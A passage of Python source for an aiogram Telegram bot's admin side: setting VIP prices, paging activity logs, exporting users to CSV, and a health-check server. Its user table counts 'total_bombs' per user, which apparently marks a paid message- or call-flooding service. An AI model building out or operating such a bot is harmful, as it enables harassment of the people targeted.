@dp.message(AdminFSM.vip_uid)
async def fsm_vip_uid(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    if not m.text.strip().isdigit(): return await m.answer("numeric")
    await state.update_data(uid=int(m.text.strip()))
    await state.set_state(AdminFSM.vip_cost)
    await m.answer("VIP cost (0 = default)")


@dp.message(AdminFSM.vip_cost)
async def fsm_vip_cost(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    try: cost = int(m.text.strip())
    except ValueError: return await m.answer("numeric")
    d = await state.get_data()
    uid = d.get("uid")
    if not get_user(uid):
        await state.clear(); return await m.answer("user not found")
    _exec("UPDATE users SET vip_cost=? WHERE user_id=?", (cost, uid))
    await state.clear()
    await m.answer(f"✅ vip cost = {cost}", reply_markup=admin_kb())


@dp.callback_query(F.data.startswith("a:logs:"))
async def cb_logs(c: types.CallbackQuery):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    page = int(c.data.split(":")[2])
    per = 15
    total = _exec("SELECT COUNT(*) c FROM logs", fetch="one")["c"]
    max_page = max(0, (total - 1) // per)
    page = min(page, max_page)
    rows = _exec("SELECT * FROM logs ORDER BY ts DESC LIMIT ? OFFSET ?",
                 (per, page * per), fetch="all")
    lines = []
    for r in rows:
        t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
        lines.append(f"{t} <code>{r['user_id']}</code> {r['action']} "
                     f"{r['detail'][:40]}")
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️", callback_data=f"a:logs:{page-1}"))
    if page < max_page:
        nav.append(InlineKeyboardButton(text="➡️", callback_data=f"a:logs:{page+1}"))
    kb = ([nav] if nav else []) + [[InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]
    await c.message.edit_text(
        f"📋 <b>Logs</b> ({page+1}/{max_page+1})\n\n" + ("\n".join(lines) or "empty"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    await c.answer()


@dp.callback_query(F.data == "a:export")
async def cb_export(c: types.CallbackQuery):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM users", fetch="all")
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["user_id","username","first_name","credits","banned",
                "total_bombs","ref_count","vip_cost","created_at"])
    for r in rows:
        w.writerow([r["user_id"], r["username"], r["first_name"], r["credits"],
                    r["banned"], r["total_bombs"], r["ref_count"],
                    r["vip_cost"], r["created_at"]])
    data = buf.getvalue().encode()
    await c.message.answer_document(
        BufferedInputFile(data, filename="users.csv"),
        caption=f"📤 {len(rows)} users exported")
    await c.answer()


# ─────────────────────────── HEALTH SERVER ───────────────────────────
async def _health_handler(request):
    return aiohttp.web.Response(text="Bot is running",
                                content_type="text/plain", status=200)


async def _run_health_server():
    app = aiohttp.web.Application()
    app.router.add_get("/", _health_handler)
    runner = aiohttp.web.AppRunner(app)
    await runner.setup()
    try:
        site = aiohttp.web.TCPSite(runner, host="0.0.0.0", port=PORT)
        await site.start()
        log.info("health server on 0.0.0.0:%d", PORT)
    except OSError as e:
        log.error("health bind failed: %s", e)
        await runner.cleanup()
        return
    try: await asyncio.Event().wait()
    finally: await runner.cleanup()


# ─────────────────────────── STARTUP ───────────────────────────
async def _periodic_prune():
    while True:
        try: prune_logs()
        except Exception: log.exception("prune failed")
        await asyncio.sleep(6 * 3600)


async def main():
    init_db()
    log.info("bot starting | port=%d", PORT)
    await bot.delete_webhook(drop_pending_updates=True)
    prune_task  = asyncio.create_task(_periodic_prune())
    health_task = asyncio.create_task(_run_health_server())
    try:
        await dp.start_polling(bot)
    finally:
        for t in (health_task, prune_task):
            if t and not t.done(): t.cancel()
        for t in (health_task, prune_task):
            try: await t
            except (asyncio.CancelledError, Exception): pass
        try: await bot.session.close()
        except Exception: pass
        try: _conn.close()
        except Exception: pass


if __name__ == "__main__":
    try: asyncio.run(main())
    except (KeyboardInterrupt, SystemExit): pass